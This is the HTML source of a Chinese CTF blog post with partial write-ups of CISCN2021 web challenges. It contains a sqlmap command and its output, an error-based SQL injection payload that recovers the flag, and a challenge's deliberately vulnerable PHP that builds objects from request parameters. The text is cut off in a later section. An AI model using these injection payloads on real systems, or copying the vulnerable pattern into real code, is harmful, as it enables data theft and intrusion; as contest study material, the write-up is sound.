@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>CISCN2021部分writeup及复现 | tyskillのBlog</title>
+
+    <link rel="stylesheet" href="/css/meme.min.7a71afbedd186ffaac4ba8190cf1910f0bcf15bc9124e380c6446e6257dfb04d.css"/>
+
+    
+    
+        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="tyskill" /><meta name="description" content="web-easy_sql waf information绕不过去，使用sqlmap注出表名 1 2 3 4 5 6 7 python sqlmap.py -u http://124.70.96.30:24321/ --data……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="tyskillのBlog" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="tyskillのBlog" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://tyskill.github.io/posts/ciscn2021/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-05-15T00:00:00+00:00",
+        "dateModified": "2021-05-16T00:00:00+00:00",
+        "url": "https://tyskill.github.io/posts/ciscn2021/",
+        "headline": "CISCN2021部分writeup及复现",
+        "description": "web-easy_sql waf information绕不过去，使用sqlmap注出表名 1 2 3 4 5 6 7 python sqlmap.py -u http://124.70.96.30:24321/ --data……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  1883 ,
+        "image": ["https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210516120922.png","https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210516120956.png"],
+        "author": {
+            "@type": "Person",
+            "email": "tyskill@foxmail.com",
+            "image": "https://tyskill.github.io/icons/icon.jpg",
+            "url": "https://tyskill.github.io",
+            "name": "tyskill"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "tyskillのBlog",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://tyskill.github.io/icons/icon.jpg"
+            },
+            "url": "https://tyskill.github.io/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://tyskill.github.io/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+
+    
+
+
+
+<meta property="og:title" content="CISCN2021部分writeup及复现" />
+<meta property="og:description" content="web-easy_sql waf information绕不过去，使用sqlmap注出表名 1 2 3 4 5 6 7 python sqlmap.py -u http://124.70.96.30:24321/ --data……" />
+<meta property="og:url" content="https://tyskill.github.io/posts/ciscn2021/" />
+<meta property="og:site_name" content="tyskillのBlog" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210516120922.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-05-15T00:00:00&#43;00:00" />
+    <meta property="article:modified_time" content="2021-05-16T00:00:00&#43;00:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">tyskillのBlog</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/"><span class="menu-item-name">首页</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/posts/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/categories/"><span class="menu-item-name">分类</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                        <li class="menu-item">
+                            <a id="theme-switcher" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5l48.8-97.5a18 18 0 0128 0l48.8 97.5 103.4 -34.5a18 18 0 0119.8 19.8l-34.5 103.4l97.5 48.8a18 18 0 010 28l-97.5 48.8 34.5 103.4a18 18 0 01-19.8 19.8l-103.4-34.5-48.8 97.5a18 18 0 01-28 0l-48.8-97.5l-103.4 34.5a18 18 0 01-19.8-19.8l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8-34.5-103.4a18 18 0 0119.8-19.8zM256 128a128 128 0 10.01 0M256 160a96 96 0 10.01 0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412a256 256 0 10154-407a11.5 11.5 0 00-5 20a201.5 201.5 0 01-134 374a11.5 11.5 0 00-15 13"/></svg></a>
+                        </li>
+                    
+                
+            
+        
+            
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">CISCN2021部分writeup及复现</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-05-15T00:00:00&#43;00:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2021.5.15</time>
+    
+    
+        
+        <time datetime="2021-05-16T00:00:00&#43;00:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.5.16</time>
+    
+    
+    
+        
+        
+        
+            
+                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/categories/ctf/" class="category-link p-category">CTF</a></span>
+            
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;1883</span>
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;4&nbsp;分钟</span>
+    
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:web-easy_sql" href="#web-easy_sql">web-easy_sql</a></li>
+    <li><a id="contents:web-easy_source" href="#web-easy_source">web-easy_source</a></li>
+    <li><a id="contents:web-middle_source" href="#web-middle_source">web-middle_source</a></li>
+    <li><a id="contents:web-upload" href="#web-upload">web-upload</a></li>
+    <li><a id="contents:web-filterunsolved" href="#web-filterunsolved">web-filter|unsolved</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+              <h2 id="web-easy_sql"><a href="#web-easy_sql" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-easy_sql" class="headings">web-easy_sql</a></h2>
+<p>waf</p>
+<p><img src="https://example.com/https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210516120922.png" alt=""></p>
+<p>information绕不过去，使用sqlmap注出表名</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python sqlmap.py -u http://124.70.96.30:24321/ --data <span class="s2">&#34;uname=admin&amp;passwd=admn&amp;Submit=%E7%99%BB%E5%BD%95&#34;</span> -D <span class="s2">&#34;security&#34;</span> --tables
+Database: security
+<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
++-------+
+<span class="p">|</span> flag  <span class="p">|</span>
+<span class="p">|</span> users <span class="p">|</span>
++-------+
+</code></pre></td></tr></table></div>
+</div>
+</div><p>无列名注入只能注出部分flag<code>CISCN{ZI9VA-3PWY5-S9RKF-O3I1T-Q3CEN-</code>，后面部分注不出来了，需要尝试别的方法。参考<a href="https://www.cnblogs.com/GH-D/p/11962522.html" target="_blank" rel="noopener">https://www.cnblogs.com/GH-D/p/11962522.html</a>使用join获得列名然后直接报错注入获得flag。</p>
+<p>payload</p>
+<pre><code>admin')||(extractvalue(1,concat(0x7e,substr((select`33faf19d-e30e-45a7-8aca-3272c975f54f`from`flag`),10),0x7e)))#
+# CISCN{zi9vA-3pwY5-S9rKf-o3I1t-Q3CeN-}
+</code></pre><h2 id="web-easy_source"><a href="#web-easy_source" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-easy_source" class="headings">web-easy_source</a></h2>
+<blockquote>
+<p>描述：你知道开发一个php程序很重要的东西是什么吗（flag在你看不到的地方）</p>
+</blockquote>
+<p>备份文件<code>index.php.swo</code></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="nf">a</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">b</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">c</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">d</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">e</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">f</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">g</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">h</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">i</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">j</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">k</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">l</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">m</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">n</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">o</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">p</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">q</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">r</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">s</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="nf">t</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="o">++</span><span class="nx">self</span><span class="o">::</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+<span class="p">}</span>
+
+<span class="nv">$rc</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rc&#34;</span><span class="p">];</span>
+<span class="nv">$rb</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rb&#34;</span><span class="p">];</span>
+<span class="nv">$ra</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ra&#34;</span><span class="p">];</span>
+<span class="nv">$rd</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;rd&#34;</span><span class="p">];</span>
+<span class="nv">$method</span><span class="o">=</span> <span class="k">new</span> <span class="nv">$rc</span><span class="p">(</span><span class="nv">$ra</span><span class="p">,</span> <span class="nv">$rb</span><span class="p">);</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$method</span><span class="o">-&gt;</span><span class="nv">$rd</span><span class="p">());</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/" target="_blank" rel="noopener">fslh-writeup | r0yanx's Blog</a></p>
+<p><img src="https://example.com/https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210516120956.png" alt=""></p>
+<h2 id="web-middle_source"><a href="#web-middle_source" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 